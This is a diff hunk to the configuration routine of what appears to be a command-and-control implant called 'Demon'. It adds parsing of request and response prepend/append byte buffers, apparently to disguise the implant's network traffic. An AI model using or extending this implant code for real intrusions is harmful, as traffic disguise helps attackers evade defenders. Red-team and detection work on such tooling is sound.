@@ -761,6 +761,64 @@ VOID DemonConfig()
     {
         PUTS( "[CONFIG] [PROXY] Disabled" );
     }
+
+    // Request Prepend/Append
+    Buffer = ParserGetBytes( &Parser, &Length );
+    if ( Length > 0 )
+    {
+        Instance->Config.Transport.Request.Prepend = MmHeapAlloc( Length );
+        Instance->Config.Transport.Request.PrependSize = Length;
+        MemCopy( Instance->Config.Transport.Request.Prepend, Buffer, Length );
+        PRINTF( "[CONFIG] [REQUEST] Prepend: %d bytes\n", Length );
+    }
+    else
+    {
+        Instance->Config.Transport.Request.Prepend = NULL;
+        Instance->Config.Transport.Request.PrependSize = 0;
+    }
+
+    Buffer = ParserGetBytes( &Parser, &Length );
+    if ( Length > 0 )
+    {
+        Instance->Config.Transport.Request.Append = MmHeapAlloc( Length );
+        Instance->Config.Transport.Request.AppendSize = Length;
+        MemCopy( Instance->Config.Transport.Request.Append, Buffer, Length );
+        PRINTF( "[CONFIG] [REQUEST] Append: %d bytes\n", Length );
+    }
+    else
+    {
+        Instance->Config.Transport.Request.Append = NULL;
+        Instance->Config.Transport.Request.AppendSize = 0;
+    }
+
+    // Response Prepend/Append
+    Buffer = ParserGetBytes( &Parser, &Length );
+    if ( Length > 0 )
+    {
+        Instance->Config.Transport.Response.Prepend = MmHeapAlloc( Length );
+        Instance->Config.Transport.Response.PrependSize = Length;
+        MemCopy( Instance->Config.Transport.Response.Prepend, Buffer, Length );
+        PRINTF( "[CONFIG] [RESPONSE] Prepend: %d bytes\n", Length );
+    }
+    else
+    {
+        Instance->Config.Transport.Response.Prepend = NULL;
+        Instance->Config.Transport.Response.PrependSize = 0;
+    }
+
+    Buffer = ParserGetBytes( &Parser, &Length );
+    if ( Length > 0 )
+    {
+        Instance->Config.Transport.Response.Append = MmHeapAlloc( Length );
+        Instance->Config.Transport.Response.AppendSize = Length;
+        MemCopy( Instance->Config.Transport.Response.Append, Buffer, Length );
+        PRINTF( "[CONFIG] [RESPONSE] Append: %d bytes\n", Length );
+    }
+    else
+    {
+        Instance->Config.Transport.Response.Append = NULL;
+        Instance->Config.Transport.Response.AppendSize = 0;
+    }
 #endif
 
 #ifdef TRANSPORT_SMB
